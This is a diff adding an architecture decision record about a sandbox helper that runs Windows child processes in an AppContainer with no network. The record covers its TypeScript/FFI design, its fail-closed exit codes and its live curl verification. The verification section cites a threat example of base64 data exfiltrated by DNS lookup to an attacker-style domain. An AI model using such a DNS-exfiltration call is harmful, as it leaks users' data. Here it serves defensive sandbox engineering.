@@ -12294,3 +12294,83 @@ ADR-0157 (the P-SANDBOX epic + threat model), ADR-0159/0166/0167/0168/0169 (P-SA
 proxy, audit, Seatbelt, and panel this extends to Windows), ADR-0028 (omp `--isolate` - the filesystem
 containment the helper leaves in place), ADR-0068 (P-ENT.1 - require-isolation now satisfiable on Windows
 once the helper ships).
+
+-----
+
+## ADR-0173 - P-SANDBOX.7: the native Windows AppContainer helper (lucid-appcontainer), BUILT + VERIFIED
+
+**Date:** 2026-07-05
+**Status:** Accepted / Built + verified (the --deny-network core). Increment 7 of the ADR-0157 epic. The
+mediated `--loopback-only` case + packaging/activation are P-SANDBOX.7b.
+
+### Context
+
+P-SANDBOX.6 (ADR-0172) built the seam: on Windows the sandbox resolves to `AppContainerBackend` and shells
+to `lucid-appcontainer <flags> -- <argv>` (Windows has no OS argv-wrapper for a sandbox). ADR-0172 chose a
+thin FIRST-PARTY helper over Bun-FFI-in-the-harness (which would break the seam's `wrap → {cmd,args,env}`
+contract) and deferred building it to its own increment "because it introduces the first native-code
+surface." This is that increment - and it resolves the native-surface tension in a way that keeps invariant
+#2 intact.
+
+### Decision - a bun-compiled TS+FFI binary (no C/Rust surface)
+
+`tools/appcontainer/lucid_appcontainer.ts` is written in **TypeScript** and compiled to a standalone
+`lucid-appcontainer.exe` with **`bun build --compile`** (`make build-appcontainer`, `--target=bun-windows-x64`
+so CI can cross-compile it for packaging). It uses **`bun:ffi`** to do the real Win32:
+- create/derive an AppContainer SID for a stable LUCID moniker (`CreateAppContainerProfile`, falling back to
+  `DeriveAppContainerSidFromAppContainerName` when the profile already exists - no admin, no package identity);
+- build `SECURITY_CAPABILITIES` with an **EMPTY capability set** - no `internetClient` ⇒ the AppContainer has
+  **no outbound network**, enforced by the Windows network stack. That IS `--deny-network`;
+- `CreateProcessW` the wrapped argv inside that AppContainer via a `PROC_THREAD_ATTRIBUTE_SECURITY_CAPABILITIES`
+  attribute list; wait; propagate the child's exit code.
+
+This satisfies BOTH constraints ADR-0172 was balancing: it is a separate binary that fits the seam's
+command-line contract, AND it stays in the Bun/TS language surface (**invariant #2 - no C/Rust/Python is
+added**; the "native" work is Win32 calls FROM TypeScript via FFI, compiled by Bun).
+
+### Fail-closed by construction (invariant #3)
+
+The seam's `isolates:true` promise MUST hold. The helper refuses (non-zero exit, never runs the child) on:
+malformed flags (exit 2, before any spawn); a mode it cannot enforce - `--loopback-only`, the mediated case,
+not yet implemented (exit 3); non-Windows (exit 3); any Win32/FFI failure (exit 3). A helper that cannot
+contain BLOCKS - a passthrough would be false security. The pure flag parser is unit-tested; the FFI edge is
+verified live (below).
+
+### Verified, not just claimed
+
+Built + run on Windows 10 (this host): a benign child (`curl.exe --version`) RUNS inside the AppContainer and
+exits 0; a networked child (`curl.exe https://example.com`) is **BLOCKED** - `http_code=000`, curl exit 28,
+propagated through the helper - while the identical curl OUTSIDE returns `http_code=200`. The compiled
+`lucid-appcontainer.exe` reproduces the block. `demo-P-SANDBOX.7` runs this live smoke on Windows (and asserts
+the fail-closed refusal off-Windows). So the ADR-0157 threat (an import-time `gethostbyname("<b64>.attacker.cn")`
+DNS exfil) is, for the network-off posture, genuinely contained on Windows: the process has no network at all.
+
+### Deliberately NOT bundled / activated yet (recorded)
+
+The helper is built + verified but is **not** placed on PATH or into packaging in this increment, because the
+COMMON omp session is `trusted-local` (`canNetwork:true`) which P-SANDBOX.6 maps to `--loopback-only` (mediated
+egress via the loopback proxy) - and that requires an AppContainer **loopback exemption** (`CheckNetIsolation`)
+plus per-child WFP rules that are **P-SANDBOX.7b**. Activating a deny-network-only helper would make the helper
+REFUSE the common session (fail-closed exit 3) and break the agent. So: `.7` ships the verified helper +
+`--deny-network`; `.7b` adds `--loopback-only` (WFP + loopback exemption) and only THEN bundles the signed
+`.exe` and lets `resolveBackend` find it. Until then Windows stays the disclosed passthrough (unchanged).
+
+### Invariants preserved
+
+Inv #1 (wrap the process; no omp fork). **Inv #2 (TypeScript/Bun only - the helper is TS compiled by Bun;
+Win32 is reached via bun:ffi, NOT a new C/Rust/Python source tree; the scanner stays the only Python).** Inv
+#3 (fail-closed: cannot-contain ⇒ refuse, never passthrough - verified). Inv #4 (in-process gate untouched).
+Inv #6 (runtime only). Inv #7 (no trust labels). Inv #8 (no EventName).
+
+### Verification
+
+`tools/appcontainer/lucid_appcontainer.test.ts` (11 pure tests: the flag parser's valid + every fail-closed
+path, Windows quoting, and main()'s refuse-codes). `demo-P-SANDBOX.7` green (live AppContainer block on
+Windows; fail-closed refusal off-Windows). `make test` green but for the pre-existing Windows-only
+fs_browse/theme-asset failures. Built in an isolated git worktree.
+
+### Relates to
+
+ADR-0172 (P-SANDBOX.6 - the seam + flag contract this helper implements), ADR-0157 (the P-SANDBOX epic +
+threat model), ADR-0166/0168 (the mediated proxy + Seatbelt's loopback-confinement that `.7b` mirrors on
+Windows), invariant #2 (the TS/Bun language boundary this deliberately keeps).
